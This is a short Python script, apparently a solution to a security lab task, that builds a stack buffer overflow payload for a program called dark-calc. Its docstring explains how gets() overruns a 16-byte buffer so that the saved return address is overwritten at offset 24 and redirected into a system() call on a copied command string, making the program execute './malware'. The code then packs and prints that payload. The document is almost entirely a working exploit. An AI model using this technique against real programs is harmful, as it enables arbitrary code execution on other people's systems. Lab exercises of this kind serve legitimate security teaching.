#!/usr/bin/env python3
"""Task 1: build the payload for attack/dark-calc.

Goal: make dark-calc run ./malware.

input() reads into a 16-byte stack buffer with gets() (no bound check) and
then strcpy()s the string into the global command_buf.  gets() lets us write
past the buffer, so 24 bytes reach input()'s saved return address.

We redirect the return address to the instruction in eval() that hands
command_buf to system(), one instruction *after* the wrapper "echo $((" is
built:

    0x401a6b:  mov $0x6030d0,%edi     ; rdi = command_buf
    0x401a70:  call 0x4017e0 <system@plt>

strcpy() has already copied our string into command_buf, so system() runs
"./malware" while dark-calc is still its ancestor.
"""
import struct
import sys

RET_SLOT = 24          # offset of input()'s saved return address
SYSTEM_ARG = 0x401A6B  # mov $command_buf,%edi ; call system@plt

payload = b"./malware\x00".ljust(RET_SLOT, b"A")
payload += struct.pack("<Q", SYSTEM_ARG)

sys.stdout.buffer.write(payload + b"\n")
